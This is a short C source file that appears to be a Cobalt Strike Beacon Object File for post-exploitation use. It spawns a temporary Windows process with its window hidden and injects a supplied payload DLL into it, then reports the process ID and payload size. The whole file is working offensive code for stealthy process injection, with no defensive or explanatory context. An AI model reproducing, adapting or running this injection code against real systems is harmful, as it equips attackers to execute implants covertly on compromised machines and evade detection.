#include <windows.h>
#include "beacon.h"

BOOL is_x64() {
#if defined _M_X64
    return TRUE;
#elif defined _M_IX86
    return FALSE;
#endif
}

void go(char* args, int len, BOOL x86) {
    STARTUPINFOA        si;
    PROCESS_INFORMATION pi;
    datap               parser;
    short               ignoreToken;
    char*               dllPtr;
    int                 dllLen;
    char*               argPtr;
    int                 argLen;
    int                 offset;

    if (!is_x64() && x86 == FALSE) {
        BeaconPrintf(CALLBACK_ERROR, "Warning: inject from x86 -> x64");
    }
    if (is_x64() && x86 == TRUE) {
        BeaconPrintf(CALLBACK_ERROR, "Warning: inject from x64 -> x86");
    }

    /* Extract the arguments */
    BeaconDataParse(&parser, args, len);
    ignoreToken = BeaconDataShort(&parser);
    offset      = BeaconDataInt(&parser);
    dllPtr      = BeaconDataExtract(&parser, &dllLen);
    argPtr      = BeaconDataExtract(&parser, &argLen);

    memset(&si, 0, sizeof(STARTUPINFOA));
    memset(&pi, 0, sizeof(PROCESS_INFORMATION));

    /* setup the other values in our startup info structure */
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.cb          = sizeof(STARTUPINFO);

    /* Ready to go: spawn, inject and cleanup */
    if (!BeaconSpawnTemporaryProcess(x86, ignoreToken, &si, &pi)) {
        BeaconPrintf(CALLBACK_ERROR, "Unable to spawn %s temporary process.", x86 ? "x86" : "x64");
        return;
    }

    BeaconInjectTemporaryProcess(&pi, dllPtr, dllLen, offset, argPtr, argLen);

    BeaconPrintf( CALLBACK_OUTPUT, "spawned %d and injected payload into it [offset: %x] [ignore-token: %d] [payload: %d bytes] [argument: %d bytes]",
        pi.dwProcessId, offset, ignoreToken, dllLen, argLen
    );

    BeaconCleanupProcess(&pi);
}

extern "C" void gox86(char* args, int alen) {
    go(args, alen, TRUE);
}

extern "C" void gox64(char* args, int alen) {
    go(args, alen, FALSE);
}
